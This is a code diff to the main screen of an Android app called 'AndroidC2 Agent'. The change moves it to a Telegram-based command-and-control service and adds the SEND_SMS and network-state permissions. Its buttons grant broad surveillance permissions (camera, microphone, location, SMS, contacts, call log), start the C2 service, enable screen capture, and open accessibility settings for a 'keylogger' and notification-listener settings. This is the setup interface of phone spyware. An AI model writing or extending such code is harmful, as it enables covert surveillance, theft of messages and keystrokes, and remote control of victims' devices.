@@ -29,11 +29,14 @@ class MainActivity : Activity() {
 
     private val PERMS = mutableListOf(
         Manifest.permission.INTERNET,
+        Manifest.permission.ACCESS_NETWORK_STATE,
+        Manifest.permission.ACCESS_WIFI_STATE,
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION,
         Manifest.permission.CAMERA,
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS,
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.READ_PHONE_STATE,
@@ -53,87 +56,91 @@ class MainActivity : Activity() {
             setPadding(32, 48, 32, 32)
         }
 
-        val title = TextView(this).apply {
+        root.addView(TextView(this).apply {
             text = "AndroidC2 Agent"
             textSize = 20f
-        }
+        })
 
-        val info = TextView(this).apply {
-            text = "C2: ${BuildConfig.C2_URL}\nKey: ${BuildConfig.API_KEY}"
+        root.addView(TextView(this).apply {
+            text = "Mode: Telegram\nBot: TelegramC2Service"
             textSize = 12f
             setPadding(0, 12, 0, 24)
-        }
+        })
 
-        val btnPerm = Button(this).apply {
+        root.addView(Button(this).apply {
             text = "1. Grant permissions"
             setOnClickListener {
                 ActivityCompat.requestPermissions(this@MainActivity, PERMS, REQ)
             }
-        }
-        val btnStart = Button(this).apply {
-            text = "2. Start service"
+        })
+        root.addView(Button(this).apply {
+            text = "2. Start Telegram C2"
             setOnClickListener {
-                val i = Intent(this@MainActivity, C2Service::class.java)
+                val i = Intent(this@MainActivity, TelegramC2Service::class.java)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                     startForegroundService(i)
                 else
                     startService(i)
-                log("main", "start service requested")
+                log("main", "TG service start requested")
             }
-        }
-        val btnStop = Button(this).apply {
-            text = "3. Stop service"
+        })
+        root.addView(Button(this).apply {
+            text = "3. Stop Telegram C2"
             setOnClickListener {
-                stopService(Intent(this@MainActivity, C2Service::class.java))
-                log("main", "stop service requested")
+                stopService(Intent(this@MainActivity, TelegramC2Service::class.java))
+                log("main", "TG service stop requested")
             }
-        }
-        val btnProjection = Button(this).apply {
+        })
+        root.addView(Button(this).apply {
             text = "4. Enable screen capture permission"
             setOnClickListener {
                 startActivity(Intent(this@MainActivity, MediaProjectionSetupActivity::class.java))
             }
-        }
-        val btnAccess = Button(this).apply {
+        })
+        root.addView(Button(this).apply {
             text = "5. Enable accessibility (keylogger)"
             setOnClickListener {
                 startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
             }
-        }
+        })
+        root.addView(Button(this).apply {
+            text = "6. Enable notification listener"
+            setOnClickListener {
+                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
+            }
+        })
 
-        val logLabel = TextView(this).apply {
+        root.addView(TextView(this).apply {
             text = "─ LOG ─"
             textSize = 11f
             setPadding(0, 24, 0, 8)
-        }
+        })
 
         val btnRow = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
         }
-        val btnCopy = Button(this).apply {
-            text = "Copy log"
+        btnRow.addView(Button(this).apply {
+            text = "Copy"
             setOnClickListener {
                 val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                 cm.setPrimaryClip(ClipData.newPlainText("c2log", LogBus.read(this@MainActivity)))
                 Toast.makeText(this@MainActivity, "copied", Toast.LENGTH_SHORT).show()
             }
-        }
-        val btnClear = Button(this).apply {
+        })
+        btnRow.addView(Button(this).apply {
             text = "Clear"
             setOnClickListener {
                 LogBus.clear(this@MainActivity)
                 logView.text = "(cleared)"
             }
-        }
-        val btnScroll = Button(this).apply {
+        })
+        btnRow.addView(Button(this).apply {
             text = "Bottom"
             setOnClickListener {
                 scroll.post { scroll.fullScroll(View.FOCUS_DOWN) }
             }
-        }
-        btnRow.addView(btnCopy)
-        btnRow.addView(btnClear)
-        btnRow.addView(btnScroll)
+        })
+        root.addView(btnRow)
 
         logView = TextView(this).apply {
             textSize = 10f
@@ -149,16 +156,6 @@ class MainActivity : Activity() {
                 LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
             )
         }
-
-        root.addView(title)
-        root.addView(info)
-        root.addView(btnPerm)
-        root.addView(btnStart)
-        root.addView(btnStop)
-        root.addView(btnProjection)
-        root.addView(btnAccess)
-        root.addView(logLabel)
-        root.addView(btnRow)
         root.addView(scroll)
 
         setContentView(root)
